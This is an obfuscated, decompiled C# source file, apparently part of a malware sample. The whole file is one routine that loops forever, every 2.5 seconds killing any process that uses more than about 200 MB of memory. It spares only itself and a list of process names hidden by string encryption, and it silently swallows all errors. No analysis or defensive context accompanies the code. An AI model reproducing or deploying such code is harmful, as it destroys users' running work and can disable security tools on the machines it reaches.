using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace UvfJgsTEpPeNG;

public static class ULvKzqROjKZy
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void KriWhLPWzdReXH()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107367177)) && !process.ProcessName.Contains(getString_0(107367168)) && !process.ProcessName.Contains(getString_0(107367127)) && !process.ProcessName.Contains(getString_0(107367118)) && !process.ProcessName.Contains(getString_0(107367137)) && !process.ProcessName.Contains(getString_0(107367092)) && !process.ProcessName.Contains(getString_0(107367111)) && !process.ProcessName.Contains(getString_0(107367066)) && !process.ProcessName.Contains(getString_0(107367053)) && !process.ProcessName.Contains(getString_0(107367072)) && !process.ProcessName.Contains(getString_0(107367051)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static ULvKzqROjKZy()
	{
		Strings.CreateGetStringDelegate(typeof(ULvKzqROjKZy));
	}
}
